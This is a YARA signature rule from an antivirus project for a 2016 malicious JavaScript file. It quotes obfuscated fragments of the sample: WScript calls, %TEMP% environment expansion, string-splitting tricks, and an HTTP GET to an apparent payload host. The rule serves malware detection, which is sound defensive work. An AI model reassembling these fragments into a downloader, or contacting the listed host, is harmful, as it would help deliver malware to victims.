rule sig_20160428_18e665344a1140c8e6c60e4735c5364b {
  meta:
    description = "datamaliciousorder - file 20160428_18e665344a1140c8e6c60e4735c5364b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "be92eee69c54c80f30e30896e4ed2a9ad348acb0b98dc94f3316adbd415544ca"

  strings:
    $s1  = "function OawQvdAulGxdCllGhvIbj(KrqArbImjKkaPukMcmSrl){KlkDehDpwKrxRwgQlaMzu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function MnyHgiJgxFduPpwLluBoy() {return KlkDehDpwKrxRwgQlaMzu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function OawQvdAulGxdCllGhvIbj(KrqArbImjKkaPukMcmSrl){KlkDehDpwKrxRwgQlaMzu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var KlkDehDpwKrxRwgQlaMzu = function UfkMdvQraNfeYvjGteEkb() {return ByfCcqHmtDyeBxdSuoTmv[HqsMwfPcoJwfCqrLeqLzj](\"WScript\"+\"" ascii
    $s5  = "function AnwKxtVplJreTpxIzmKym(ErdVwyRbdRlsBkgGhlEsb, MvdHjyMweTigSboMruVam){RkuMkcZgmTmeGgbTpwJij = RkuMkcZgmTmeGgbTpwJij * 1; " ascii
    $s6  = "return ErdVwyRbdRlsBkgGhlEsb - MvdHjyMweTigSboMruVam;};" fullword ascii
    $s7  = "YyeYohNegCwfZewUnbPax[NbbUkcKvtYayCjyFbjMxj](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s8  = "var KlkDehDpwKrxRwgQlaMzu = function UfkMdvQraNfeYvjGteEkb() {return ByfCcqHmtDyeBxdSuoTmv[HqsMwfPcoJwfCqrLeqLzj](\"WScript\"+\"" ascii
    $s9  = "var ByfCcqHmtDyeBxdSuoTmv = this[\"WScript\"];" fullword ascii
    $s10 = "function MnyHgiJgxFduPpwLluBoy() {return KlkDehDpwKrxRwgQlaMzu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function AnwKxtVplJreTpxIzmKym(ErdVwyRbdRlsBkgGhlEsb, MvdHjyMweTigSboMruVam){RkuMkcZgmTmeGgbTpwJij = RkuMkcZgmTmeGgbTpwJij * 1; " ascii
    $s12 = "if (YyeYohNegCwfZewUnbPax[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function MewPwxAnaLnuIdxKswIxz(){return ObqFyuFumYawUyzBloDam + \"\";};" fullword ascii
    $s14 = "function JqoMuaYyiIogQxhYggVbi() {return ((HdsFzzDdqGjzKivNmiDzg == true) && (HdsFzzDdqGjzKivNmiDzg == DmrCsuQfeVzrKznZvvVhz)) ?" ascii
    $s15 = "function JqoMuaYyiIogQxhYggVbi() {return ((HdsFzzDdqGjzKivNmiDzg == true) && (HdsFzzDdqGjzKivNmiDzg == DmrCsuQfeVzrKznZvvVhz)) ?" ascii
    $s16 = "function QflIrjMwuIaaSvxAygIzy(IewPtiLpxTzzKouKshAsp) {var YrfGkaZpdImoXyxXwyPmd = (1, 2, 3, 4, 5, IewPtiLpxTzzKouKshAsp); retur" ascii
    $s17 = "var DmrCsuQfeVzrKznZvvVhz = false;" fullword ascii
    $s18 = "function XfzCbzDkyGifGueMqgUcu()" fullword ascii
    $s19 = "function DkqZyiJpcOfnXfvNrrRjf(){return HqsMwfPcoJwfCqrLeqLzj;};" fullword ascii
    $s20 = "var SybPfzRekXcdTkjOqyFfq = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}